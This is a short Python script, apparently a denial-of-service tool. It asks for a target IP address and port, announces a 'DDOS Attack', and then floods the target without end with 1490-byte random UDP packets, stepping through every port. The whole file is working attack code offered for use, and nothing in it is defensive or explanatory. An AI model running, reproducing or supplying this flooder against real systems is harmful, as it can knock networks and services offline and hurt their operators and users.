import sys
import os
import time
import socket
import random
from datetime import datetime

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
print('DDOS Attack Starting...')
time.sleep(5)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1